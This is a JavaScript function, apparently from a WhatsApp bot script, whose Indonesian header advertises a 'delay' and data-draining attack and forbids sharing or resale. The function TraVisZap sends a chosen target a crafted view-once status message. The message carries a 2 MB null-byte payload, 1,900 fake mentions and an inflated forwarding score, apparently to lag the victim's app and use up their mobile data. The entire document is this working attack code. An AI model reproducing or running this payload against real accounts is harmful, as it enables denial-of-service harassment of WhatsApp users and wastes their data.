/*
[+] new functions delay+nguras kouta

- sender ngak kena sedot/delay
- jangan share ke pt/free
- error? report to the owner
- pt func? chat saja 
- delay hard
- nguras Kouta
- no share / sale
*/


async function TraVisZap(isTarget, mention = true/false) {
    console.log(chalk.red("#sockzX"));

    let payload = "";
    for (let i = 0; i < 900; i++) {
        payload = "\u0000".repeat(2097152);
    }

    const mentionedJid = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
    ];

    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
      fileLength: "211396",
      height: 816,
      width: 654,
      mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
      fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
      directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1749220174",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAADBQACBAEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABhB6gNNNTGLcMDiZqB7ZW0LKXPmQBV8PTrzAOOPOOzh1ugQ0IE9MlGMO6SszJlz8K2m4Hs5mG9JBJWQ4aQtvkP/8QAKRAAAgIBAgQEBwAAAAAAAAAAAQIAAxEEIRASEzEUQVJxBSMkQlFTYv/aAAgBAQABPwCzlbcRFyohSFIyQpGY115ni7PyZWQwwdjFGF4EQiFY9YavEK7y2pLFDVneV5KDMM1euKErXDq7z95lfxC1dm3hsFmnDDgtzDYShs1gmMAyEiaul0Yw7Hhp0KaTfz4FuUkyhvkL7Q3tW4AORmalBdWGEtUq5yIhHMM9syx1XTAjtiddoxZicgyvPhlGfKKC7gCarVdABF7y2w2kk9+C3PyFM7cG1L4IAERwmmDN6YdUq2Blmrt6lrGZg3lVBfG88Gn7I9JrfBEZvp8fzDWwMw2cYnTfMpqQrzY3ENirhT3hLZ84yq4wRHXCER7BneGxcY3hsBIMrtIr5V7kxhgp7wIvon//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/ACf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/ACf/2Q==",
                    contextInfo: {
                        mentionedJid: mentionedJid,
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 2097152,
                        isForwarded: true
                    }
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: payload
                }
            }
        }
    };

    const msg = await generateWAMessageFromContent(isTarget, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                    protocolMessage: {
                            key: msg.key,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "XxTravas" }, // Jangan Dihapus
                        content: undefined
                    }
                ]
            }
        );
    }
}